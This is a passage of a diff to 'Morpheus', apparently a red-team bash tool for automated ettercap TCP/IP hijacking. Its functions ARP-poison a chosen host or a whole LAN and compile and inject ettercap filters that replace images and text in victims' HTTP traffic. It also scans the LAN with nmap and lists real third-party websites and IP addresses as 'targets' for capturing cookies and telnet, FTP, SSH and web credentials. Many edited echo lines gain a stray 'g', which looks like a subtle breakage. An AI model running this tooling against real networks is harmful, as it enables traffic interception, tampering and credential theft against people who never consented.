+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1799,13 +1799,13 @@
 # --------------------------------
 sh_stage15 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}     This filter will replace the html tag '<img src=>' and       ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  injects your image in any webpage requested by target (http)    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
-echo "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}     This filter will replace the html tag '<img src=>' and       ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  injects your image in any webpage requested by target (http)    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1813,14 +1813,14 @@
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
 cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
 sleep 1
 
-  echo ${BlueF}[☠]${white} Edit img_replace.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Edit img_replace.eft${RedF}!${Reset};
   sleep 1
  fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
@@ -1832,7 +1832,7 @@
   sleep 1
 
     # compiling img_replace.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
     sleep 1
     # port-forward
@@ -1841,32 +1841,32 @@
 
       # run mitm+filter
       # HINT: irongeek nao usou UID 0 e SSL active...
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost/ /$gateway/
         fi
       fi
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -1875,7 +1875,7 @@
   cd $IPATH
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1888,12 +1888,12 @@
 # --------------------------------
 sh_stage16 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}   This filter will replace text in target tcp responses (http)   ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
-echo "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}   This filter will replace text in target tcp responses (http)   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1901,14 +1901,14 @@
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
 cp $IPATH/filters/text_replace.eft $IPATH/filters/text_replace.rb > /dev/null 2>&1
 sleep 1
 
-  echo ${BlueF}[☠]${white} Edit text_replace.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Edit text_replace.eft${RedF}!${Reset};
   sleep 1
  fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  rep_one=$(zenity --title="☠ WORD TO REPLACE ☠" --text "example: hello\nchose a word to be replaced in tcp packet." --entry --width 270) > /dev/null 2>&1
@@ -1924,7 +1924,7 @@
   sleep 1
 
     # compiling img_replace.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling text_replace.eft${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Compiling text_replace.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/text_replace.eft -o $IPATH/output/text_replace.ef && sleep 3"
     sleep 1
     # port-forward
@@ -1933,32 +1933,32 @@
 
       # run mitm+filter
       # HINT: irongeek nao usou UID 0 e SSL active...
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -L $IPATH/logs/text_replace -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -L $IPATH/logs/text_replace -M ARP /$rhost/ /$gateway/
         fi
       fi
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/text_replace.rb $IPATH/filters/text_replace.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -1967,7 +1967,7 @@
   cd $IPATH
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1982,11 +1982,11 @@
 # ----------------------
 sh_stageW () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module allow you to write your own filter from scratch.  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  morpheus presents a 'template' previous build for you to write  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} your own command logic and automate the compile/lunch of filter. ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}    This module allow you to write your own filter from scratch.  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  morpheus presents a 'template' previous build for you to write  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} your own command logic and automate the compile/lunch of filter. ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1994,20 +1994,20 @@
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Edit template${RedF}!${Reset};
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
   sleep 1
 
     # compiling template.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Compiling template${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
     sleep 1
     # port-forward
@@ -2015,32 +2015,32 @@
     cd $IPATH/logs
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
         fi
       fi
-    
+
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -2049,7 +2049,7 @@
   cd $IPATH
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -2064,30 +2064,30 @@
 # ------------------------------------------------
 sh_stageS () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module uses nmap framework to report live hosts (LAN)    ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}    This module uses nmap framework to report live hosts (LAN)    ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
 rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
+  echo -e ${BlueF}g[☠]${white} Scanning Local Lan${RedF}! ${Reset};
   # grab ip range + scan with nmap + zenity display results
   IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
-  echo ${BlueF}[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
+  echo -e ${BlueF}g[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
   # scan local lan using nmap
   nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Scanning local lan..." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
   # strip results and print report
   cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 410 --height 400 > /dev/null 2>&1
 
     # cleanup
-    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
     rm $IPATH/logs/lan.mop > /dev/null 2>&1
     sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -2103,22 +2103,22 @@
 sh_stageT () {
 echo ""
 echo "${white}    Available targets For testing [HTTP] "
-echo "${BlueF}    ╔─────────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    |  ${YellowF}http://pastebin.com                          [User-Agent|cookie]${BlueF}   |"
-echo "${BlueF}    |  ${YellowF}http://eventolinux.org                       [User-Agent|cookie]${BlueF}   |"
-echo "${BlueF}    |  ${YellowF}http://predragtasevski.com                   [User-Agent capture]${BlueF}  |"
-echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com                 [User-Agent|cookie]${BlueF}   |"
-echo "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/            [http_creds]${BlueF}          |"
-echo "${BlueF}    |  ${YellowF}http://malwareforensics1.blogspot.pt         [User-Agent capture]${BlueF}  |"
-echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com/forum/login.php [User-Agent|cookie]${BlueF}   |"
-echo "${BlueF}    |  ${YellowF}telnet 216.58.214.174                        [telnet_creds]${BlueF}        |"
-echo "${BlueF}    |  ${YellowF}telnet 192.168.1.254                         [telnet_creds]${BlueF}        |"
-echo "${BlueF}    |  ${YellowF}ftp 192.168.1.254                            [ftp_creds]${BlueF}           |"
-echo "${BlueF}    |  ${YellowF}ssh 192.168.1.254                            [ssh_creds]${BlueF}           |"
-echo "${BlueF}    |  ${YellowF}ping -c 2 www.househot.com                   [mocbotIRC detection]${BlueF} |"
-echo "${BlueF}    ╠─────────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔─────────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    |  ${YellowF}http://pastebin.com                          [User-Agent|cookie]${BlueF}   |"
+echo -e "${BlueF}    |  ${YellowF}http://eventolinux.org                       [User-Agent|cookie]${BlueF}   |"
+echo -e "${BlueF}    |  ${YellowF}http://predragtasevski.com                   [User-Agent capture]${BlueF}  |"
+echo -e "${BlueF}    |  ${YellowF}http://www.portugalpesca.com                 [User-Agent|cookie]${BlueF}   |"
+echo -e "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/            [http_creds]${BlueF}          |"
+echo -e "${BlueF}    |  ${YellowF}http://malwareforensics1.blogspot.pt         [User-Agent capture]${BlueF}  |"
+echo -e "${BlueF}    |  ${YellowF}http://www.portugalpesca.com/forum/login.php [User-Agent|cookie]${BlueF}   |"
+echo -e "${BlueF}    |  ${YellowF}telnet 216.58.214.174                        [telnet_creds]${BlueF}        |"
+echo -e "${BlueF}    |  ${YellowF}telnet 192.168.1.254                         [telnet_creds]${BlueF}        |"
+echo -e "${BlueF}    |  ${YellowF}ftp 192.168.1.254                            [ftp_creds]${BlueF}           |"
+echo -e "${BlueF}    |  ${YellowF}ssh 192.168.1.254                            [ssh_creds]${BlueF}           |"
+echo -e "${BlueF}    |  ${YellowF}ping -c 2 www.househot.com                   [mocbotIRC detection]${BlueF} |"
+echo -e "${BlueF}    ╠─────────────────────────────────────────────────────────────────────╝"
 sleep 1
-echo "${BlueF}    ╘ ${white}Press [${GreenF}ENTER${white}] to 'return' to main menu${RedF}!"
+echo -e "${BlueF}    ╘ ${white}Press [${GreenF}ENTER${white}] to 'return' to main menu${RedF}!"
 read OP
 }
 
@@ -2132,14 +2132,14 @@
 sh_help () {
 echo ""
 echo "${white}    Morpheus help menu${RedF}:"
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF} 1 - framework tutorials                                          ${BlueF}|"
-echo "${BlueF}    | ${YellowF} 2 - framework enhancement                                        ${BlueF}|"
-echo "${BlueF}    | ${YellowF} 3 - framework bug report/support                                 ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} R - return to main menu                                          ${BlueF}|"
-echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
-echo "${BlueF}    ╘ ${white}Please chose the help required..."
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF} 1 - framework tutorials                                          ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} 2 - framework enhancement                                        ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} 3 - framework bug report/support                                 ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} R - return to main menu                                          ${BlueF}|"
+echo -e "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╘ ${white}Please chose the help required..."
 sleep 1
 echo ""
 echo -n "$PrompT"
@@ -2162,9 +2162,9 @@
 # FUNTION TO EXIT FRAMEWORK
 # -------------------------
 sh_exit () {
-echo ${BlueF}[☠]${white} Exit morpheus framework...${Reset};
+echo -e ${BlueF}g[☠]${white} Exit morpheus framework...${Reset};
 sleep 1
-echo ${BlueF}[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
+echo -e ${BlueF}g[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
 mv /tmp/etter.conf $Econ > /dev/null 2>&1
 mv /tmp/etter.dns $Edns > /dev/null 2>&1
 mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
@@ -2173,8 +2173,8 @@
 rm $ApachE/index.html > /dev/null 2>&1
 sleep 2
 clear
-echo ${RedF}codename${white}::${RedF}oneiroi_phobetor'(The mithologic dream greek god)'${Reset};
-echo ${RedF}Morpheus${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2017  ${Reset};
+echo -e ${RedF}gcodename${white}::${RedF}oneiroi_phobetor'(The mithologic dream greek god)'${Reset};
+echo -e ${RedF}gMorpheus${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2017  ${Reset};
 exit
 }
 
@@ -2191,7 +2191,7 @@
 while :
 do
 clear
-echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
+echo "" && echo -e "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
 cat << !
     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
@@ -2200,7 +2200,7 @@
     ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
 !
-echo ${BlueF}"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
+echo -e ${BlueF}g"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
 cat << !
     ╔────────╦──────────────────────────────────────────────────────────╗
     | OPTION |                  DESCRIPTION(filters)                    |
@@ -2228,10 +2228,10 @@
     |   E    -  Exit/close Morpheus                                     |
     ╚───────────────────────────────────────────────────────────────────╣
 !
-echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2017${BlueF}_⌋${Reset}"
-echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
+echo -e "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2017${BlueF}_⌋${Reset}"
+echo -e ${BlueF}g[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
 sleep 1
-echo ${BlueF}[▶]${white} Chose Your Option[filter]${RedF}: ${Reset};
+echo -e ${BlueF}g[▶]${white} Chose Your Option[filter]${RedF}: ${Reset};
 echo -n "$PrompT"
 read choice
 case $choice in
